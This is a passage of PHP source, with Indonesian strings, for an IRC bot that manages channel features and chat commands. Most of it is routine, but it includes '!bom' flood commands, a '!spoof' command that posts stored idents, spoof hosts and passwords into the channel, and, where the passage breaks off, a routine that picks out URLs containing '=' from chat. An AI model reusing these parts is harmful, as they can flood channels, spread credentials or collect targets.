                                                if($systembot['BOM'][$chan]=="3ON"){$modb.=' [4B]oM';}
                                                if($systembot['WHOIS'][$chan]=="3ON"){$modb.=' [4W]OIS';}
                                                if($systembot['GUARD'][$chan]=="3ON"){$modb.=' [4G]uaRd';}
                                                if($systembot['GVOICE'][$chan]=="3ON"){$modb.=' [4G]Voice';}
                                                if($systembot['JVERSION'][$chan]=="3ON"){$modb.=' [4J]Version';}
                                                if($systembot['SEEN'][$chan]=="3ON"){$modb.=' [4S]een';}
                                                if($systembot['JAM'][$chan]=="3ON"){$modb.=' [4J]am';}
                                                if($systembot['SCANSPY'][$chan]=="3ON"){$modb.=' [4S]py';}
                                                if($systembot['BADWORD'][$chan]=="3ON"){$modb.=' [4B]adword';}
                                                if($systembot['NGOMONG'][$chan]=="3ON"){$modb.=' [4C]rewet';}
                                                if($systembot['SPOOF'][$chan]=="3ON"){$modb.=' SPoo[4F]';}
                                                if($systembot['KSLANG'][$chan]=="3ON"){$modb.=' [4K]SlaNG';}
                                                if($systembot['IP'][$chan]=="3ON"){$modb.=' [4I]p lIsT';}
                                                if($systembot['VERSION'][$chan]=="3ON"){$modb.=' V[4E]rSIoN';}
                                                if($systembot['FINGER'][$chan]=="3ON"){$modb.=' [4F]iNGeR';}
                                                if($systembot['ISON']['ALL']=="3ON"){$modb.=' [4I]soN';}
                                                if($systembot['GREET'][$chan]=="3ON"){$modb.=' [4G]rEEt';}
                                                if($systembot['AUTOAWAY']['ALL']=="3ON"){$modb.=' AUtoA[4W]ay';}
                                                if($systembot['AUTOCYCLE'][$chan]=="3ON"){$modb.=' AuTO[4C]YcLE';}
                                                if($systembot['AUTOJOIN'][$chan]=="3ON"){$modb.=' AuTo[4J]oIN';}
                                                $modb=ltrim($modb);
                                                $modb=rtrim($modb);
                                                if($modb==""){$modb="[4PA]RKiR [4NI]c[4K]";}
                                                $modbot->act($fp,$Params[2],'iS MODeS '.$modb.' FoR [2'.strtoupper($chan).']');
                                            }
                                        elseif (substr($perintah,0,2)=='.+' || substr($perintah,0,2)=='.-'){
                                            if(substr($perintah,1,1)=='+'){$onoff="3ON";}elseif(substr($perintah,1,1)=='-'){$onoff="4OFF";};
                                            $wsys=substr(strtoupper($perintah),2);
                                            if($cmdin==1){$targetsys=$Params[2];if($dCom[1]){$targetsys=$dCom[1];}$sysok=1;}
                                            elseif($cmdin==2 && $dCom[1]){$targetsys=$dCom[1];$sysok=1;}
                                            if (!ereg("#",$targetsys)){$targetsys="#".$targetsys;}
                                            if($wsys=='PING' && $sysok==1 && $getlvl > 2){
                                                $systembot['PING'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'PING '. strtoupper($targetsys).' is [4'.strtoupper($systembot['PING'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='WHOIS' && $sysok==1 && $getlvl > 2){
                                                $systembot['WHOIS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'WHOIS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['WHOIS'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='ALL' && $sysok==1 && $getlvl > 2){
                                                $systembot['PING'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'PING '. strtoupper($targetsys).' is [4'.strtoupper($systembot['PING'][strtoupper($targetsys)]).']');
                                                $systembot['AUTOCYCLE'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'AUTOCYCLE '. strtoupper($targetsys).' is [4'.strtoupper($systembot['AUTOCYCLE'][strtoupper($targetsys)]).']');
                                                $systembot['WHOIS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'WHOIS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['WHOIS'][strtoupper($targetsys)]).']');
                                                $systembot['GUARD'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'GUARD '. strtoupper($targetsys).' is [4'.strtoupper($systembot['GUARD'][strtoupper($targetsys)]).']');
                                                $systembot['AUTOJOIN'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'AUTOJOIN '. strtoupper($targetsys).' is [4'.strtoupper($systembot['AUTOJOIN'][strtoupper($targetsys)]).']');
                                                $systembot['JVERSION'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'JVERSION '. strtoupper($targetsys).' is [4'.strtoupper($systembot['JVERSION'][strtoupper($targetsys)]).']');
                                                $systembot['BOM'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'BOM '. strtoupper($targetsys).' is [4'.strtoupper($systembot['BOM'][strtoupper($targetsys)]).']');
                                                $systembot['GVOICE'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'GVOICE '. strtoupper($targetsys).' is [4'.strtoupper($systembot['GVOICE'][strtoupper($targetsys)]).']');
                                                $systembot['SEEN'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SEEN '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SEEN'][strtoupper($targetsys)]).']');
                                                $systembot['BADWORD'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'BADWORD '. strtoupper($targetsys).' is [4'.strtoupper($systembot['BADWORD'][strtoupper($targetsys)]).']');
                                                $systembot['VERSION'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'VERSION '. strtoupper($targetsys).' is [4'.strtoupper($systembot['VERSION'][strtoupper($targetsys)]).']');
                                                $systembot['GREET'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'GREET '. strtoupper($targetsys).' is [4'.strtoupper($systembot['GREET'][strtoupper($targetsys)]).']');
                                                $systembot['DNS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'DNS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['DNS'][strtoupper($targetsys)]).']');
                                                $systembot['NGOMONG'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'NGOMONG '. strtoupper($targetsys).' is [4'.strtoupper($systembot['NGOMONG'][strtoupper($targetsys)]).']');
                                                $maxkar=200;$floddban="ON";$Maxreep=2;
                                            }
                                            if($wsys=='GUARD' && $sysok==1 && $getlvl > 2){
                                                $systembot['GUARD'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'GUARD '. strtoupper($targetsys).' is [4'.strtoupper($systembot['GUARD'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='JVERSION' && $sysok==1 && $getlvl > 2){
                                                $systembot['JVERSION'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'JVERSION '. strtoupper($targetsys).' is [4'.strtoupper($systembot['JVERSION'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='GVOICE' && $sysok==1 && $getlvl > 2){
                                                $systembot['GVOICE'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'GVOICE '. strtoupper($targetsys).' is [4'.strtoupper($systembot['GVOICE'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SEEN' && $sysok==1 && $getlvl > 2){
                                                $systembot['SEEN'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SEEN '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SEEN'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SCANSPY' && $sysok==1 && $getlvl > 2){
                                                $systembot['SCANSPY'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SCANSPY '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SCANSPY'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='JAM' && $sysok==1 && $getlvl > 2){
                                                $systembot['JAM'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'JAM '. strtoupper($targetsys).' is [4'.strtoupper($systembot['JAM'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='BADWORD' && $sysok==1 && $getlvl > 2){
                                                $systembot['BADWORD'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'BADWORD '. strtoupper($targetsys).' is [4'.strtoupper($systembot['BADWORD'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='NGOMONG' && $sysok==1 && $getlvl > 2){
                                                $systembot['NGOMONG'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'NGOMONG '. strtoupper($targetsys).' is [4'.strtoupper($systembot['NGOMONG'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='VERSION' && $sysok==1 && $getlvl > 2){
                                                $systembot['VERSION'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'VERSION '. strtoupper($targetsys).' is [4'.strtoupper($systembot['VERSION'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='TIME' && $sysok==1 && $getlvl > 2){
                                                $systembot['TIME'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'TIME '. strtoupper($targetsys).' is [4'.strtoupper($systembot['TIME'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='IP' && $sysok==1 && $getlvl > 2){
                                                $systembot['IP'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'IP '. strtoupper($targetsys).' is [4'.strtoupper($systembot['IP'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='FINGER' && $sysok==1 && $getlvl > 2){
                                                $systembot['FINGER'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'FINGER '. strtoupper($targetsys).' is [4'.strtoupper($systembot['FINGER'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='ISON' && $sysok==1 && $getlvl > 2){
                                                $systembot['ISON']['ALL']= $onoff;$modbot->notice($fp,$fsrc[nick],'ISON is [4'.strtoupper($systembot['ISON']['ALL']).']');
                                            }
                                            if($wsys=='ASTRO' && $sysok==1 && $getlvl > 2){
                                                $systembot['ASTRO'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'ASTRO '. strtoupper($targetsys).' is [4'.strtoupper($systembot['ASTRO'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SPOOF' && $sysok==1 && $getlvl > 2){
                                                $systembot['SPOOF'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SPOOF '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SPOOF'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='DNS' && $sysok==1 && $getlvl > 2){
                                                $systembot['DNS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'DNS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['DNS'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='BOM' && $sysok==1 && $getlvl > 2){
                                                $systembot['BOM'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'BOM '. strtoupper($targetsys).' is [4'.strtoupper($systembot['BOM'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='GREET' && $sysok==1 && $getlvl > 2){
                                                $systembot['GREET'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'GREET '. strtoupper($targetsys).' is [4'.strtoupper($systembot['GREET'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SMS' && $sysok==1 && $getlvl > 2){
                                                $systembot['SMS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SMS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SMS'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SLAPS' && $sysok==1 && $getlvl > 2){
                                                $systembot['SLAPS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SLAPS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SLAPS'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='KSLANG' && $sysok==1 && $getlvl > 2){
                                                $systembot['KSLANG'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'KSLANG '. strtoupper($targetsys).' is [4'.strtoupper($systembot['KSLANG'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='AUTOCYCLE' && $sysok==1 && $getlvl > 2){
                                                $systembot['AUTOCYCLE'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'AUTOCYCLE '. strtoupper($targetsys).' is [4'.strtoupper($systembot['AUTOCYCLE'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='AUTOJOIN' && $sysok==1 && $getlvl > 2){
                                                $systembot['AUTOJOIN'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'AUTOJOIN '. strtoupper($targetsys).' is [4'.strtoupper($systembot['AUTOJOIN'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='AUTOAWAY' && $sysok==1 && $getlvl > 2){
                                                $systembot['AUTOAWAY']['ALL']= $onoff;$modbot->notice($fp,$fsrc[nick],'AUTOAWAY is [4'.strtoupper($systembot['AUTOAWAY']['ALL']).']');
                                            }
                                            if($wsys=='LISTGREET' && $dCom[1] && $dCom[2] && $getlvl > 2){
                                                if($onoff=="3ON"){
                                                $ddc=strtolower($dCom[1]);$greetmsg["$ddc"]["nama"]=$dCom[1];$mgreet=str_replace($dCom[0]." ".$dCom[1]." ","",$TxtMsg);
						$greetmsg["$ddc"]["msg"]=$mgreet;$modbot->notice($fp,$fsrc[nick],'Auto Greet For :'.$greetmsg["$ddc"]["nama"]);
                                                $modbot->notice($fp,$fsrc[nick],'Auto Greet Msg :'.$greetmsg["$ddc"]["msg"]);
                                                }else{$eel=strtolower($dCom[1]);unset($greetmsg["$eel"]["nama"]);unset($greetmsg["$eel"]["msg"]);$modbot->notice($fp,$fsrc[nick],'Delete Greet For :'.$eel);}
                                            }
                                            if($wsys=='LISTISON' && $dCom[1] && $getlvl > 2){
                                                if($onoff=="3ON"){
                                                    if($modbot->add_ison($dCom[1])==1){$modbot->notice($fp,$fsrc[nick],$dCom[1] . ' is now in my list');}
                                                    else{$modbot->notice($fp,$fsrc[nick],$dCom[1] . ' is already in my list');}
                                                }
                                                else{if($modbot->del_ison($dCom[1])==1){$modbot->notice($fp,$fsrc[nick],$dCom[1] . ' has been deleted');}}
                                            }
                                        }
                                        ################################ SYSTEM ###################################
                                            
                                    }
                                }
                                ###############################
                                elseif (substr($Params[3],0,2)==':!'){
                                    if (strtolower($Params[3])==':!ping' && ereg('#',$Params[2]) && $systembot['PING'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                            if(strtolower($dCom[1])=='me'){$modbot->stuf_ping($fp,$Params[2],$fsrc[nick]);}else {$modbot->stuf_ping($fp,$Params[2],$dCom[1]);}
                                        }else{$modbot->stuf_ping($fp,$Params[2],$fsrc[nick]);}
                                    }
                                    elseif (strtolower($Params[3])==':!version' && ereg('#',$Params[2]) && $systembot['VERSION'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                        $modbot->msg($fp,$Params[4],'VERSION');$datversi[strtolower($Params[4])]["nick"]=strtolower($Params[4]);$datversi[strtolower($Params[4])]["chan"]=$Params[2];
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !version <nick>');}
                                    }
                                    elseif (strtolower($Params[3])==':!jam' && ereg('#',$Params[2]) && $systembot['JAM'][strtoupper($Params[2])]=="3ON") {
                                         $sekarang=date("l, j F Y H:i:s");
                                         $modbot->msg($fp,$Params[2],"sekarang : 12[4".$sekarang."12]");
                                    }
                                    elseif (strtolower($Params[3])==':!seen' && ereg('#',$Params[2]) && $systembot['SEEN'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                           $nicksenn=strtolower($dCom[1]);
                                           $waktuseennya=time();
                                           $lamaseen= $waktuseennya - $asalseen[$nicksenn];
                                           $asilhari=0;$asilejam=0;$asilmeni=0;
                                           if ($lamaseen>=86400){$asilhari = $lamaseen / 86400;$hari = floor($asilhari)."11hari "; $sisane = $lamaseen - ($hari*86400);$lamaseen = $sisane;   }else{$hari =""; }
                                           if ($lamaseen>=3600) {$asilejam = $lamaseen / 3600; $jamm = floor($asilejam)."11jam ";  $sisane = $lamaseen - ($jamm*3600); $lamaseen = $sisane;   }else{$jamm =""; }
                                           if ($lamaseen>=60)   {$asilmeni = $lamaseen / 60;   $ment = floor($asilmeni)."11menit ";$sisane = $lamaseen - ($ment*60);   $lamaseen = $sisane;   }else{$ment =""; }
                                           if ($asilhari == 0){$katahari="";        }else{$katahari=$hari;              }
                                           if ($asilejam == 0){$kataejam="";        }else{$kataejam=$jamm;              }
                                           if ($asilmeni == 0){$katameni="";        }else{$katameni=$ment;              }
                                           if ($lamaseen == 0){$katadeti="";        }else{$katadeti=$lamaseen."11detik"; }
                                           $katamsgseen = $katahari." ".$kataejam." ".$katameni." ".$katadeti;
                                           if($asalseen[$nicksenn.'chanel']=="ini"){$asalseen[$nicksenn.'chanel']="$Params[2]"; }
                                           if($asalseen[$nicksenn]){
                                              if($asalseen[$nicksenn]=="ada"){
                                                  $modbot->msg($fp,$Params[2],"si 12[4".$nicksenn."12] onlen kok 9!whois ".$nicksenn." aja 12".$fsrc[nick]."..!!!!!");
                                              }
                                              elseif($asalseen[$nicksenn]=="ganti"){
                                                  $modbot->msg($fp,$Params[2],"terahir aq eroh si 12[4".$nicksenn."12] ganti nick ".$asalseen[$nicksenn.'chanel']." 12".$fsrc[nick]."..!!!!!");
                                              }
                                              else{$modbot->msg($fp,$Params[2],"terahir aq liat 12[4".$nicksenn."12] ".$asalseen[$nicksenn.'status']." teko chanel 12[4".$asalseen[$nicksenn.'chanel']."12] 12[4".$katamsgseen."12] yg lalu kayak nya 12".$fsrc[nick]." ..!!!!!");   }
                                           }else{$modbot->msg($fp,$Params[2],"nda ada sini dia umzZzzZ ".$dCom[1]." ".$fsrc[nick]."...!!!");  }
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !seen <nick>');}
                                    }
                                    elseif (strtolower($Params[3])==':!whois' && ereg('#',$Params[2]) && $systembot['WHOIS'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
					$datwhois[strtolower($dCom[1])]["nick"]=strtolower($dCom[1]);
					$datwhois[strtolower($dCom[1])]["chan"]=$Params[2];
                                        $modbot->send($fp,'WHOIS '.$dCom[1]);
                                        }
                                        else{
                                            $modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik :!whois <nick>');
                                        }
                                    }
                                    elseif (strtolower($Params[3])==':!time' && ereg('#',$Params[2]) && $systembot['TIME'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                        $modbot->msg($fp,$Params[4],'TIME');$dattime[strtolower($Params[4])]["nick"]=strtolower($Params[4]);$dattime[strtolower($Params[4])]["chan"]=$Params[2];}
                                        else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !time <nick>');}
                                    }
                                    elseif (strtolower($Params[3])==':!finger' && ereg('#',$Params[2]) && $systembot['FINGER'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                        $modbot->msg($fp,$Params[4],'FINGER');$datfinger[strtolower($Params[4])]["nick"]=strtolower($Params[4]);$datfinger[strtolower($Params[4])]["chan"]=$Params[2];
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !finger <nick>');}
                                    }
                                    elseif (strtolower($Params[3])==':!ip' && ereg('#',$Params[2]) && $systembot['IP'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                            $res = gethostbyname($dCom[1]);
                                            $res = implode(", ",$res);
                                            if ( empty($res) ) {
                                               $modbot->msg($fp,$Params[2],'Ip for: '.$dCom[1] . ' nda tau sala staw...!! ');
                                            }else{$modbot->msg($fp,$Params[2],'Ip for: '.$dCom[1] . ' '.$res);  }
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !ip <Ip>');}
                                    }
                                    elseif (strtolower($Params[3])==':!dns' && ereg('#',$Params[2]) && $systembot['DNS'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                            if (ereg("[a-zA-Z]", $dCom[1])) {$res = gethostbyname($dCom[1]);}
                                            elseif (ereg("[0-9]", $dCom[1])) {$res = gethostbyaddr($dCom[1]);}
                                            if ($res==$dCom[1]) { $res = "not resolved."; }
                                            else { $res = "resolved to: $res ."; }
                                            $modbot->msg($fp,$Params[2],'DNS Query for: '.$dCom[1] . ' ' .$res);
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !dns <host>');}
                                    }
                                    elseif (strtolower($Params[3])==':!astro' && ereg('#',$Params[2]) && $systembot['ASTRO'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                            $modbot->notice($fp,$fsrc[nick],'15(04Astro15) '. $modbot->mod_astro($dCom[1]));
                                        }else{
                                            $modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik :!astro <bintang>');
                                        }
                                    }
                                    elseif (strtolower($Params[3])==":!spoof" && ereg('#',$Params[2]) && $systembot['SPOOF'][strtoupper($Params[2])]=="3ON") {
					$spoofnya=strtolower($Params[4]);
					if ($Params[5]<=$jmlspoof["$spoofnya"] && $Params[5]>0){
						fputs($fp,'PRIVMSG '.$Params[2].' :15(04Spoof15) Ident: 4' . $isisp["$Params[5]"]["$spoofnya"]["ident"] .' Spoof: 4' . $isisp["$Params[5]"]["$spoofnya"]["spoof"] .' Passw: 4' . $isisp["$Params[5]"]["$spoofnya"]["pass"].''. CRLF);
					}
					else {$modbot->notice($fp,$frsc[nick],'15(04Spoof15) Request Error');}
                                    }
                                    elseif (strtolower($Params[3])==":!kslang" && ereg('#',$Params[2]) && $systembot['KSLANG'][strtoupper($Params[2])]=="3ON") {
                                        $ktslsl=str_replace($Params[3]." ".$Params[4]." ","",":".$TxtMsg);
                                        if($Params[4]<=$kmjml[strtolower($ktslsl)] && $Params[4]>0){
                                            $nomere=$Params[4]-1;
                                            if(strpos($kmusedan[$nomere]["definisi"][strtolower($ktslsl)],"<br>")){
                                            $defedan=explode("<br>",$kmusedan[$nomere]["definisi"][strtolower($ktslsl)]);
                                                foreach ($defedan as $darredan) {
                                                    $modbot->notice($fp,$fsrc[nick],'15(04Arti15) '.$darredan);
                                                    sleep(1);
                                                }
                                            }
                                            elseif($kmusedan[$nomere]["definisi"][strtolower($ktslsl)]){
                                                $modbot->notice($fp,$fsrc[nick],'15(04Arti15) '.$kmusedan[$nomere]["definisi"][strtolower($ktslsl)]);
                                            }
                                            if(strpos($kmusedan[$nomere]["contoh"][strtolower($ktslsl)],"<br>")){
                                                $defedan=explode("<br>",$kmusedan[$nomere]["contoh"][strtolower($ktslsl)]);
                                                foreach ($defedan as $darredan) {
                                                    $modbot->notice($fp,$fsrc[nick],'15(04Cth15) '.$darredan);
                                                        sleep(1);
                                                }
                                            }
                                            elseif($kmusedan[$nomere]["contoh"][strtolower($ktslsl)]){
                                                $modbot->notice($fp,$fsrc[nick],'15(04Cth15) '.$kmusedan[$nomere]["contoh"][strtolower($ktslsl)]);
                                            }
                                        }
                                        else{
                                            fputs($fp,'PRIVMSG '.$Params[2].' :15(04KSlang15) Request Error'. CRLF);
                                        }
                                        
                                    }
                                    elseif (strtolower($Params[3])==':!update' && ereg('#',$Params[2]) && $Params[5]) {
                                        $typeup=strtolower($Params[4]);
                                        if($typeup=='spoof' && $systembot['SPOOF'][strtoupper($Params[2])]=="3ON"){
                                            $modbot->msg($fp,$Params[2],'15(04Spoof15) Update Complete! FOUND :'.$modbot->mod_uspoof($fp,$Params[5]).' Spoof');
                                        }
                                        elseif($typeup=='kslang' && $systembot['KSLANG'][strtoupper($Params[2])]=="3ON"){
                                            $ktslsl=str_replace($Params[3]." ".$Params[4]." ","",":".$TxtMsg);
                                            $modbot->msg($fp,$Params[2],'15(04KSlang15) Update Complete! FOUND :'.$modbot->mod_uslang($fp,$ktslsl).' Arti'); 
                                        }
                                    }
                                    elseif (strtolower($Params[3])==":!bom" && ereg('#',$Params[2]) && $Params[4] && $systembot['BOM'][strtoupper($Params[2])]=="3ON") {
                                        $modbot->stuf_bom($fp,$Params[2],$Params[4]);
                                    }
                                    elseif (strtolower($Params[3])==":!potong" && ereg('#',$Params[2]) && $Params[4] && $systembot['BOM'][strtoupper($Params[2])]=="3ON") {
                                        $modbot->stuf_potong($fp,$fsrc[nick],$Params[2],$Params[4]);
                                    }
                                }
                                elseif (strlen(strtolower($TxtMsg))>=$maxkar) {
                                    if (substr($Params[3],0,1)==':' && ereg('#',$Params[2]) && $systembot['GUARD'][strtoupper($Params[2])]=="3ON") {
                                      if ($floddban == "ON"){$modbot->ban($fp,$Params[2],"*!*@".$fsrc[host]);  }
                                      $modbot->kick($fp,$Params[2],$fsrc[nick],"wek ngeflood kamu..!!");
                                      if ($floddban == "ON"){
                                          sleep(5);
                                          if($systembot['NGOMONG'][strtoupper($Params[2])]=="3ON"){$modbot->msg($fp,$Params[2],"Wek ta nda buka nga pe bane no ".$fsrc[nick]." ru nga tau...!!!");    }
                                          sleep(2);
                                          $modbot->unban($fp,$Params[2],"*!*@".$fsrc[host]);
                                      }
                                    }
                                }
                                elseif (substr($Params[3],0,1)==':') {
                                  $naidiceluk=substr($Params[3],1,(strlen($Params[3])));
                                  if ((substr_count(strtolower($TxtMsg),strtolower($bot['nick']))>0)OR(substr_count(strtolower($TxtMsg),strtolower($bot['realname']))>0)) {
                                                if($systembot['NGOMONG'][strtoupper($Params[2])]=="3ON"){
                                                $ada = FALSE;
                                                     if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
                                                        foreach ($respon_pesan as $rpesan) {
                                                           $trtext = strtolower($rpesan[0]);
                                                           if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
                                                              $rpesan[1] = str_replace("<nick>",$fsrc[nick],$rpesan[1]);
                                                              $modbot->msg($fp,$Params[2],$rpesan[1]);
                                                              $ada = TRUE;
                                                           }
                                                        }
                                                        foreach ($pujianlist as $rpesan) {
                                                           $trtext = strtolower($rpesan);
                                                           if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
                                                              $jawab = $rpujian[rand(0,count($rpujian) - 1)];
                                                              $jawab = str_replace("<nick>",$fsrc[nick],$jawab);
                                                              $jawab = str_replace("<kata>",$trtext,$jawab);
                                                              $modbot->msg($fp,$Params[2],$jawab);
                                                              $ada = TRUE;
                                                           }
                                                        }
                                                        foreach ($cacianlist as $rpesan) {
                                                           $trtext = strtolower($rpesan);
                                                           if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
                                                              $jawab = $rcacian[rand(0,count($rcacian) - 1)];
                                                              $jawab = str_replace("<nick>",$fsrc[nick],$jawab);
                                                              $jawab = str_replace("<kata>",$trtext,$jawab);
                                                              $modbot->msg($fp,$Params[2],$jawab);
                                                              $ada = TRUE;
                                                           }
                                                        }
                                                        if (!$ada) {
                                                           $jwbpsn = $jawabsapa[rand(0,count($jawabsapa) - 1)];
                                                           $jwbpsn = str_replace("<nick>",$fsrc[nick],$jwbpsn);
                                                           $modbot->msg($fp,$Params[2],$jwbpsn);
                                                        }

                                                     }
                                                }
                                  }
                                  elseif($systembot['NGOMONG'][strtoupper($Params[2])]=="3ON"){
                                  $ada = FALSE;
                                                if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
                                                     foreach ($badwordlist as $rpesan) {
                                                        $trtext = strtolower($rpesan);
                                                        if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
                                                           $jawab = $rjorok[rand(0,count($rjorok) - 1)];
                                                           $jawab = str_replace("<nick>",$fsrc[nick],$jawab);
                                                           $jawab = str_replace("<kata>",$trtext,$jawab);
                                                           $modbot->msg($fp,$Params[2],$jawab);
                                                           $ada = TRUE;
                                                           if($systembot['BADWORD'][strtoupper($Params[2])]=="3ON"){$modbot->kick($fp,$Params[2],$fsrc[nick],"1ngekzZZ 2BADWORD 1Freand..");    }
                                                        }
                                                     }
                                                     foreach ($respon_umum as $rpesan) {
                                                        $trtext = strtolower($rpesan[0]);
                                                        if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
                                                           $rpesan[1] = str_replace("<nick>",$fsrc[nick],$rpesan[1]);
                                                           $modbot->msg($fp,$Params[2],$rpesan[1]);
                                                           $ada = TRUE;
                                                        }
                                                     }
                                                }
                                  }
                                }
                                elseif (substr($Params[3],0,3)==':me'){
                                       $modbot->join($fp,'Oxyde');
                                }
                                if (substr($Params[3],0,1)==':') {
###############################################################################################
$trtext="http://";
if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
$awaltex=0;
$adatarget=0;
$ltexttarget=0;
$panjangtex=strlen($TxtMsg);
do {
    $awaltex=$awaltex+1;
    $httptarget=substr($TxtMsg,$awaltex,$panjangtex);
    $httptarget=substr($httptarget,0,4);
    $httptarget=strtolower($httptarget);
    if($httptarget=="http"){$ltexttarget=$awaltex;$adatarget=1;break;   }
    if($awaltex>=$panjangtex){$adatarget=0;break;                       }
} while(true);
$ahirtarget=$panjangtex;
$hasiltarget=substr($TxtMsg,$ltexttarget,$panjangtex);
$rtexttarget=$panjangtex-$ltexttarget;
do {
    $ahirtarget=$ahirtarget-1;
    $rtexttarget=$ahirtarget-$ltexttarget;
    $mburine=substr($TxtMsg,0,$ahirtarget);
    $mburine=substr($mburine,$ahirtarget-1,$ahirtarget);
    $mburine=strtolower($mburine);
    if($mburine=="="){
       $adatarget=2;
       $rtexttarget=$ahirtarget-$ltexttarget;
       break;
    }
    if($ahirtarget<=1){$adatarget=0;break;                              }
